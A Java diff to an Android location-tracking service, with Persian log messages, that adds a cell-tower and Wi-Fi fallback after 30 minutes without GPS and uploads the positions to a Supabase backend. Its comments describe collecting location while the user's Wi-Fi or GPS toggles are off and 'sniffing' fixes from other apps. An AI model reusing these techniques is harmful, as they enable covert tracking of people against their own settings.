@@ -53,6 +53,7 @@ public class TrackingService extends Service {
     private static long lastSuccessfulInternetTime = System.currentTimeMillis();
     private static long lastSentCloudLocationTime = 0;
     private static long lastValidGpsTime = 0;
+    private static long lastFallbackTriggerTime = 0;
 
     private Handler offlineMonitorHandler;
     private Runnable offlineMonitorRunnable;
@@ -291,14 +292,6 @@ public class TrackingService extends Service {
 
             fusedLocationClient.requestLocationUpdates(locationRequestHigh, locationCallback, Looper.getMainLooper());
 
-            // Balanced Power request (uses Cell-Towers & Wi-Fi routers even if GPS satellite toggle is off)
-            LocationRequest locationRequestBalanced = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, harvestMillis)
-                    .setMinUpdateIntervalMillis(Math.max(3000L, harvestMillis / 2))
-                    .setMinUpdateDistanceMeters(0)
-                    .build();
-
-            fusedLocationClient.requestLocationUpdates(locationRequestBalanced, locationCallback, Looper.getMainLooper());
-
             // Trigger background WiFi scan so nearby routers are cached even when WiFi toggle is off
             triggerBackgroundWifiScan();
 
@@ -367,20 +360,6 @@ public class TrackingService extends Service {
                 }
             } catch (Exception ignored) {}
 
-            // Register Cell Network Provider (works indoors and even when GPS satellite is turned off)
-            try {
-                if (nativeLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                    nativeLocationManager.requestLocationUpdates(
-                            LocationManager.NETWORK_PROVIDER,
-                            harvestMillis,
-                            0,
-                            nativeLocationListener,
-                            Looper.getMainLooper()
-                    );
-                    LogManager.info("LOCATION", "گیرنده بومی دکل‌های مخابراتی (Network Provider) متصل است.");
-                }
-            } catch (Exception ignored) {}
-
             // Passive provider (sniffing location from Google Maps, WhatsApp, Snapp, etc.)
             try {
                 nativeLocationManager.requestLocationUpdates(
@@ -434,8 +413,19 @@ public class TrackingService extends Service {
             
             // Check if this meal was already sent (Stale Meal check)
             if (harvested.timestamp == lastSentCloudLocationTime) {
-                LogManager.info("SUPABASE", "لقمه روی میز تکراری است (جی‌پی‌اس خاموش یا بدون حرکت). فقط تپش قلب زنده ارسال می‌شود...");
-                sendKeepAliveStatusOnly();
+                if (System.currentTimeMillis() - lastValidGpsTime > 30 * 60 * 1000) {
+                    if (System.currentTimeMillis() - lastFallbackTriggerTime > 5 * 60 * 1000) {
+                        lastFallbackTriggerTime = System.currentTimeMillis();
+                        LogManager.warning("SUPABASE", "بیشتر از ۳۰ دقیقه است که سیگنال GPS دریافت نشده! در حال فعال‌سازی سیستم رهگیری دکل/وای‌فای...");
+                        tryFallbackHarvest();
+                    } else {
+                        LogManager.info("SUPABASE", "لقمه دکل روی میز تکراری است. فقط تپش قلب زنده ارسال می‌شود...");
+                        sendKeepAliveStatusOnly();
+                    }
+                } else {
+                    LogManager.info("SUPABASE", "لقمه روی میز تکراری است (جی‌پی‌اس خاموش یا بدون حرکت). فقط تپش قلب زنده ارسال می‌شود...");
+                    sendKeepAliveStatusOnly();
+                }
                 return;
             }
             
